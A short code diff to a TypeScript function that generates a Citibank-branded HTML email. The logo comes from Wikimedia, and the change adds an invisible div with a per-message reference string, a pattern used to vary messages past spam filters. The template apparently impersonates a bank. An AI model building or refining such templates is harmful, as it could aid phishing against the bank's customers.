@@ -130,6 +130,7 @@ export const getCitiBankEmailTemplate = (data: any) => `<!DOCTYPE html>
     </style>
 </head>
 <body style="margin: 0; padding: 0; background-color: #ffffff;">
+    <div style="display:none;font-size:1px;color:#ffffff;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div>
     <div class="email-container">
             <div class="header" style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/7/73/Citi_logo_March_2023.svg" alt="Citibank" class="logo" style="width: 85px; height: auto; margin-right: 40px;">
